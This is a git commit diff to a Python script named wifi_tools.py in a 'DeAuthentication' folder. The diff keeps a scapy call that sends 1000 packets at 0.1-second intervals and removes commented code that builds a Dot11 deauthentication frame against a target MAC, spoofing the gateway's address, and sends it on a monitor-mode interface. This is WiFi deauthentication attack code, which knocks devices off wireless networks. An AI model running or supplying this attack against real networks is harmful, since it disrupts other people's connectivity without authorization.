4b57685b73a17b309dd9a29f1e80625bad20459f
0301yasiru <0301yasiru@gmail.com>
2022-08-07 19:08:48 +0530

    DEAUTH: wifi tools coded basicaly

--- DeAuthentication/wifi_tools.py
+++ DeAuthentication/wifi_tools.py
@@ -34,9 +34,3 @@ else:
 
     ## sending the packet
     scapy.sendp(packet, inter = 0.1, count = 1000, iface = options.iface, verbose = 1)
-
-    # dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-    # # stack them up
-    # packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-    # # send the packet
-    # sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)
